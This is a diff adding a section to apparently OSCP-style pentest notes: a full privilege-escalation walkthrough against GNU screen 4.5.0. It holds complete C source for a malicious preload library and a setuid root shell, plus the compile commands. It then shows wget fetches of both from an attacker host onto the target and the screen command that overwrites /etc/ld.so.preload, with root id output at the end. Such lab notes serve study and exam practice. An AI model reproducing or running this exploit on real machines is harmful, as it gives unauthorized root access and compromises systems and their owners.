@@ -1844,6 +1844,84 @@ Password: pass123
 id
 uid=0(root) gid=0(root) groups=0(root)
 ````
+#### /usr/bin/screen-4.5.0
+````
+https://www.youtube.com/watch?v=RP4hAC96VxQ
+````
+````
+https://www.exploit-db.com/exploits/41154
+````
+````
+uname -a
+Linux oscp 5.4.0-104-generic #118-Ubuntu SMP Wed Mar 2 19:02:41 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+````
+##### Setup
+````
+kali㉿kali)-[/opt/XenSpawn]
+└─$ sudo systemd-nspawn -M Machine1
+````
+````
+cd /var/lib/machines/Machine1/root
+````
+````
+vim libhax.c
+cat libhax.c 
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown("/tmp/rootshell", 0, 0);
+    chmod("/tmp/rootshell", 04755);
+    unlink("/etc/ld.so.preload");
+    printf("[+] done!\n");
+}
+````
+````
+vim rootshell.c
+cat rootshell.c 
+#include <stdio.h>
+int main(void){
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+    execvp("/bin/sh", NULL, NULL);
+}
+````
+````
+root@Machine1:~# ls
+libhax.c  rootshell.c
+root@Machine1:~# gcc -fPIC -shared -ldl -o libhax.so libhax.c
+root@Machine1:~# gcc -o rootshell rootshell.c
+````
+##### Attack
+````
+cd /tmp
+aero@oscp:/tmp$ wget http://192.168.45.208:80/rootshell
+aero@oscp:/tmp$ wget http://192.168.45.208:80/libhax.so
+chmod +x rootshell
+chmod +x libhax.so
+````
+````
+aero@oscp:/$ /tmp/rootshell
+/tmp/rootshell
+$ id
+id
+uid=1000(aero) gid=1000(aero) groups=1000(aero)
+
+aero@oscp:/$ cd /etc
+aero@oscp:/etc$ umask 000
+aero@oscp:/etc$ screen-4.5.0 -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
+aero@oscp:/etc$ ls -l ld.so.preload
+aero@oscp:/etc$ screen-4.5.0 -ls
+
+aero@oscp:/etc$ /tmp/rootshell
+/tmp/rootshell
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+````
 ### cat /etc/crontab
 #### bash file
 ````
